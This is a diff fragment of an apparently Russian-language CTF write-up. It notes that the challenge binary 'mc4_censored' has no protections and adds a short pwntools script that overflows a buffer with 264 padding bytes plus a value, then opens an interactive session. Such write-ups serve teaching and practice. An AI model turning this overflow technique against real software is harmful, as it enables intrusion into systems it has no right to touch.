@@ -35,3 +35,17 @@ p = ELF('./mc4_censored')
 
 ![image](https://github.com/user-attachments/assets/dd5d7fc8-a415-49a0-9e67-29d2ab92ef75)
 
+Никаких защит не стоит, все замечательно, можно спокойно переполнять. Напишем следующий скрипт на языке python
+
+```py
+#!/usr/bin/env python3
+from pwn import *
+
+
+p = process('./mc4_censored')
+pause()
+p.sendline(b"A"*264 + b"Yesss!")
+p.interactive()
+
+```
+
